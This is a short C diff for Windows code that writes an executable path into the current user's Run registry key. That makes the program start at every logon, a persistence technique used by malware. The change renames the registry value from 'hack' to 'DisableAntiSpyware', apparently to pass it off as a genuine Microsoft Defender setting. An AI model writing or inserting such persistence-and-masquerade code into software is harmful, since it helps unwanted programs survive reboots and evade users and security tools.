@@ -12,7 +12,8 @@ int main(int argc, char* argv[]) {
     LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
 
     // create new registry key
-    RegSetValueExA(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+    RegSetValueExA(hkey, (LPCSTR)"DisableAntiSpyware", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
     RegCloseKey(hkey);
+
     return 0;
 }
